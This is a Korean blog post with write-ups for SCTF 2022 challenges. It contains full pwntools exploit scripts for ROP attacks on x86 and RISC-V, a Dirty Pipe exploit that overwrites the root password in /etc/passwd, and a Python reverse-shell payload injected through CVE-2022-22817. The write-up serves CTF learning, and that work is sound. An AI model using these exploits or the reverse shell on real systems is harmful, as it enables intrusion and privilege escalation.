---
layout: post
title: SCTF 2022 write-up
date: 2022-08-24 23:10:00 +0900
categories: [Security, CTF]
tags: [CTF, linux]
media_subpath: /assets/img/
---

![rank](0824-sctf-writeup/01-rank.png){: width="50%" height="50%"}
*수고했다! 다음엔 더 잘해보자~*

---

- [**Pwnable**](#pwnable)
  - [**pppr**](#pppr)
  - [**riscy**](#riscy)
  - [**Super mario**](#super-mario)
- [**Web**](#web)
  - [**Imageium**](#imageium)
- [**Reversing & Misc**](#reversing--misc)
  - [**DocsArchive**](#docsarchive)
  - [**Maze Adventure**](#maze-adventure)

---

## **Pwnable**
### **pppr**

- Arch : i386-32-little
- RELRO : <span style="color: #008000">Full RELRO</span>
- Stack : <span style="color: red">No Canary found</span>
- NX : <span style="color: #008000">NX enabled</span>
- PIE : <span style="color: red">No PIE (0x400000)</span>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[4]; // [esp+0h] [ebp-8h] BYREF

  setbuf(stdin, 0);
  setbuf(stdout, 0);
  alarm(0xAu);

  r(v4, 64, 0); // read(0, v4, 64);
  return 0;
}

```
v4에서 BOF가 발생하고, 이를 바탕으로, ROP를 수행하여 쉘을 따내는 문제이다.

문제에서는 system@plt를 제공하기 때문에, libc를 leak할 필요도 없고 제공해주지도 않았다.

제목이 pppr, 즉, pop이 3개 있는 gadget을 사용하라는 의미이고, 적당히 BSS 세그먼트에 `"/bin/sh"`를 작성하고, 쉘을 띄우면 된다.

```python
from pwn import *

p = remote('pppr.sstf.site', 1337)
system_plt = 0x80483d0
r = 0x8048526
pppr = 0x080486a9
buf_in_bss = 0x804a040

payload = b'A'*0xC
payload += p32(r)
payload += p32(pppr)
payload += p32(buf_in_bss)
payload += p32(0x100)
payload += p32(0)
payload += p32(system_plt)
payload += p32(0)
payload += p32(buf_in_bss)
p.sendline(payload)
p.sendline(b'/bin/sh')

p.interactive()
```

`SCTF{Anc13nt_x86_R0P_5kiLl}`


### **riscy**
- Arch : em_riscv-64-little
- RELRO : <span style="color: #ffd33d">Partial RELRO</span>
- Stack : <span style="color: red">No Canary found</span>
- NX : <span style="color: #008000">NX enabled</span>
- PIE : <span style="color: red">No PIE (0x400000)</span>

```c
int main(int argc, char *argv[])
{
  ...
  start();
  return 0;
}

void start() {
  printf("IOLI Crackme Level 0x00\n");
  printf("Password:");

  char buf[32];
  memset(buf, 0, sizeof(buf));
  read(0, buf, 256);
  
  if (!strcmp(buf, "250382"))
    printf("Password OK :)\n");
  else
    printf("Invalid Password!\n");
}
```
start 함수 내부에서 BOF가 발생한다.

그런데, 문제는 아키텍쳐가 RISC-V기 때문에 관련 내용을 알아보다가 풀이 시간이 길어졌다.

내가 짧게나마 이해한 바로는, RISC-V 64비트 아키텍쳐는 다음과 같았다.

- 레지스터
  - `a0` ~ `a7` : 함수 인자
  - `s0` ~ `s11` : saved register (함수 시작 부분과 끝 부분에 스택에 저장되었다가 레지스터로 복구)
  - `a7` : syscall number
  - `ra` : Return Address
  - `sp` : 스택 포인터
  - `pc` : Program Counter (RIP라고 생각하면 편함)

- 어셈블리어
  - `ld` : 메모리에서 레지스터로 값을 가져올 때 사용
  - `sd` : 레지스터에서 스택으로 값을 저장할 때 사용
  - `li` : 레지스터로 상수를 로드할 때 사용
  - `mv` : 레지스터에서 레지스터로 값을 옮길 때 사용
  - `ecall` : syscall
  - `ret` : `ra` 레지스터에 있는 값을 `pc` 레지스터로 옮김
  - `j*` : `jmp`
  - `jal*` : `call`

그리고, 이제 할 것은 `execve("/bin/sh", 0, 0)`을 실행시키기 위한 유용한 gadget을 찾는 일이다.

- `a0` : `"/bin/sh"`
- `a1` : 0
- `a2` : 0
- `a7` : 221

아참, syscall table은 [여기](https://marcin.juszkiewicz.com.pl/download/tables/syscalls.html)서 구했다.

마침 문제 바이너리가 static으로 컴파일되어 있기 때문에, 좋은 것들이 많다.

나는 다음과 같은 gadget을 사용했다.

```
gadget1
   4a1e8:   60a6                    ld  ra,72(sp)
   4a1ea:   6406                    ld  s0,64(sp)
   4a1ec:   74e2                    ld  s1,56(sp)
   4a1ee:   7942                    ld  s2,48(sp)
   4a1f0:   79a2                    ld  s3,40(sp)
   4a1f2:   7a02                    ld  s4,32(sp)
   4a1f4:   6ae2                    ld  s5,24(sp)
   4a1f6:   6b42                    ld  s6,16(sp)
   4a1f8:   6ba2                    ld  s7,8(sp)
   4a1fa:   6161                    addi    sp,sp,80
   4a1fc:   8082                    ret

gadget2
   2b568:	68e2                	ld	a7,24(sp)
   2b56a:	6802                	ld	a6,0(sp)
   2b56c:	65a2                	ld	a1,8(sp)
   2b56e:	6542                	ld	a0,16(sp)
   2b570:	87d6                	mv	a5,s5
   2b572:	4701                	li	a4,0
   2b574:	4681                	li	a3,0
   2b576:	4601                	li	a2,0
   2b578:	9a02                	jalr	s4
```

```python
from pwn import *

p = remote('riscy.sstf.site', 18223)

gadget1 = 0x4a1e8
gadget2 = 0x2b568
gadget3 = 0x47586
payload = b'/bin/sh\x00'
payload += p64(0) * 4
payload += p64(gadget1)
payload += p64(0) * 4
payload += p64(gadget3)         # s4 (ecall gadget)
payload += p64(0) * 3
payload += p64(0x4000800cd8)
payload += p64(gadget2)
payload += p64(0)
payload += p64(0)               # a1
payload += p64(0x4000800ce0)    # a0
payload += p64(221)             # a7
print(len(payload))
p.send(payload)
p.interactive()
```

ASLR이 걸려 있지 않은지, 스택의 주소가 바뀌지 않았다.

마침 gdb로 vmmap을 쳐도 qemu라고만 나오고 주소가 제대로 나오지 않았는데, 다행이다하고 스택에 그냥 썼다. (이거 때문에 도커에서 주소 다시 찾았다..)

이 문제를 통해, 정규표현식에 다시금 익숙해질 수 있었다.

`SCTF{Ropping RISCV is no difference!}`

### **Super mario**
- Arch : amd64-64-little
- RELRO : <span style="color: #008000">Full RELRO</span>
- Stack : <span style="color: #008000">Canary found</span>
- NX : <span style="color: #008000">NX enabled</span>
- PIE : <span style="color: #008000">PIE enabled</span>

Super mario 문제는 단순히 Dirty pipe를 이용한 문제였다.

Dirty pipe는 단순히 설명하면 파이프 버퍼 구조체인 `struct pipe_buffer`의 `flags` 멤버가 초기화되지 않아, 쓰기 권한이 없는 파일이 없음에도, read-only 파일에 대한 페이지 캐시에 덮어쓰기하고, 그 내용이 원본에도 반영되는 취약점이다.

원본 PoC에서는 `splice()`를 이용하고 있지만, `sendfile()` 또한 가능하다는 것을 언급하고 있고, 이 문제는 `sendfile()`을 이용해서 Dirty Pipe를 일으키는 문제이다.

Dirty Pipe 자체는 PoC가 단순한데, 그래서 이 문제도 풀이가 단순하다.

1. pipe를 만들고, 파이프의 내용을 꽉 채웠다가 모두 비운다. 이는 `pipe_buffer`의 `flags`를 `PIPE_BUF_FLAG_CAN_MERGE`로 세팅해두기 위함이다.
2. `sendfile()`를 이용해, read-only 파일의 내용을 파이프에 넣는다. 이때, 실제 파일의 내용이 복사되는 것이 아니라, 페이지 캐시의 주소를 저장하는 것이다.
3. 파이프에 임의의 데이터를 작성한다. 이 데이터는 페이지 캐시의 내용을 덮어쓰고, 이는 원본 파일에 반영된다.

문제 풀이를 진행할 때는, `/etc/passwd`에서 root 유저의 비밀번호를 'piped'로 바꾸었고,

문제에서 실행해주는 파일인 /home/guest/info.sh의 내용을 bash 쉘을 띄우는 걸로 바꾸었다.

처음에는 uname 바이너리의 내용을 바꿔서 쉘을 띄우려고 했는데, 삽질을 좀 했다... 이상하게 서버에선 바뀌어도 쉘이 안 띄워지더라? 이유는 모른다 ㅠㅠ.

```python
from pwn import *

def write_pipe(payload):
    p.sendlineafter(b"cmd>", b'2')
    p.sendlineafter(b"size?>\n", str(len(payload)).encode())
    p.sendafter(b"input>", payload)

def read_pipe():
    p.sendlineafter(b"cmd>", b'1')

def read_file(path, size):
    p.sendlineafter(b"cmd>", b'4')
    p.sendlineafter(b"Path>", path)
    p.sendlineafter(b"size?>", str(size).encode())

context.log_level = 'debug'
p = remote('supermario.sstf.site', 34003)
for _ in range(0x10):
    write_pipe(b'A'*0x1000)

for _ in range(0x10):
    read_pipe()

read_file(b'/etc/passwd', 0x4)
write_pipe(b':$6$root$xgJsQ7yaob86QFGQQYOK0UUj.tXqKn0SLwPRqCaLs19pqYr0p1euYYLqIC6Wh2NyiiZ0Y9lXJkClRiZkeB/Q.0:0:0:test:/root:/bin/sh\n') # set root passwd to 'piped'

read_file(b'/home/guest/info.sh', 0x1)
write_pipe(b'!/bin/sh\n/bin/bash\n')

p.interactive()
```

`SCTF{cl3ar_D1rty_p1p3}`


## **Web**
### **Imageium**

옵션을 선택해서 주면, 한 개의 사진에서 색에 변화를 시켜서 보여주는 웹사이트였다.

색이 변하는 사진의 링크를 찾아가서, 플래그 주세요하고 인자를 바꿨더니, 저런 출력을 주더라.

![web](0824-sctf-writeup/02-web1.png)

ImageMath? 구글링 좀 하니 다음 정보를 얻을 수 있었다.

[https://www.cvedetails.com/cve/CVE-2022-22817/](https://www.cvedetails.com/cve/CVE-2022-22817/)

CVE-2022-22817을 이용한 문제였다. 

왠지 공격자가 입력할 수 있는 유일한 창구인 mode 변수에 exec를 주고 임의 명령을 실행시킬 수 있을 것 같았다.

```
/dynamic/modified?mode=exec("import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')")
```

파이썬에서 리버스 쉘 코드 찾아서, 가져다가 실행시켰고, 플래그 찾아서 읽었다.

![web](0824-sctf-writeup/03-web2.png)

`SCTF{3acH_1m@ge_Has_iTs_0wN_MagIC}`

## **Reversing & Misc**
### **DocsArchive**

![docs1](0824-sctf-writeup/04-docs0.png)

원본 파일을 복사해두고, 워드 파일을 zip로 바꿔서 압축해제했다.

![docs2](0824-sctf-writeup/04-docs1.png)

그러면 여러 파일 및 폴더가 존재하는 것을 볼 수 있는데, 여기서 word\embeddings\oleObject1.bin을 보면 첨부된 파일을 볼 수 있다.

![docs3](0824-sctf-writeup/04-docs2.png)

파일의 헤더가 `D0 CF 11 E0 A1 B1 1A E1`이다.

여기에 해당하는 게 여러 개라 다 찍먹했다.. ~~모르면 맞아야지~~

![docs4](0824-sctf-writeup/04-docs3.png)

다 안 됐다! 그래서, HxD로 봤을 때, 눈에 띄던 이미지 파일만 먼저 추출해보기로 했다.

![docs5](0824-sctf-writeup/04-docs4.png)

? 플래그였다.

`SCTF{Do-y0u-kn0w-01E-4nd-3mf-forM4t?}`

이렇게 푸는 거 아닌가보당.

### **Maze Adventure**

![maze1](0824-sctf-writeup/05-maze1.png)

electron으로 만들어진 게임에서 crack을 만드는 문제이다. 돈을 많이 벌어야 하고, 스테이지 3를 깨야 한다는 조건이 있었다.

electron의 소스 코드는 쉽게 얻을 수 있는데, 바로, npm을 통해 asar 패키지를 설치해서 사용하면 된다.

문제에서 제공한 파일을 실행시키면, `/tmp/.mount*`로 Maze Adventure 디렉토리가 생긴다. 그걸 그대로 복사해왔다.

그리고, resource/app.asar에서 소스 코드를 얻어냈다. [참고](https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37)

electron에 대해서는 잘 모르지만, 소스 코드 수정은 할 줄 알기 때문에, 자바스크립트로 되어 있는 소스 코드를 오디팅했다.

처음에는 상점 부분 코드를 찾고 나서, 조건문을 0으로 만들어 시간을 늘려보려 했는데, 코드를 전부 본 건 아니라 이유는 알 수 없지만 안 되더라!

그러다가, 플래그를 출력해줄 것만 같은 코드를 발견했다.

![maze2](0824-sctf-writeup/05-maze2.png)

그게 플래그였다.

![maze3](0824-sctf-writeup/05-maze3.png)

조금 더 어렵게 만들 수 있었을텐데, 초보자를 위한 배려였을까? 감사합니다 :-)

`SCTF{three_d_mAzE_cOOL}`